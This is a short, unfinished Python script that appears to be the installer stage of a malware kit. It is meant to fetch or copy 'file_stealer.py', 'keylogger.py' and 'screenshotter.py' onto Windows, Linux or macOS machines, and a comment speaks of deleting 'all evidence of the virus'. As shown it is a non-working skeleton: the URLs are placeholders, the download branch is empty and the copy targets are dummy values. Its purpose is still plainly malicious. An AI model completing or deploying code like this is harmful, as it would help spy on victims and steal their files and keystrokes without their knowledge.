# the script that makes everyhting work

# TODO LIST:
# 1. mechanism to download the files from online
# 2. mechanism to get the scripts if they are available locally (such as in a zip etc)
import shutil
import sys

download = False # whether you need to download the scripts from a specified URL online or they are available locally
zip = False # whether the scripts will all be zipped together

scripts_url = {
    'file_stealer.py':'URL_HERE',
    'keylogger.py':'URL_HERE',
    'screenshotter.py':'URL_HERE'
}

scripts_loc = {
    'file_stealer.py':'URL_HERE',
    'keylogger.py':'URL_HERE',
    'screenshotter.py':'URL_HERE'
}

def get_scripts():
    if download:
        pass
    else:
        new_scripts_loc = {}
        if 'win' in sys.platform:
            for script in scripts_loc:
                dest = 'a'
                shutil.copyfile(scripts_loc[script], '')
        elif 'linux' in sys.platform:
            dest = 'a'
        elif 'darwin' in sys.platform:
            dest = 'a'
        else:
            # delete all evidence of the virus
            pass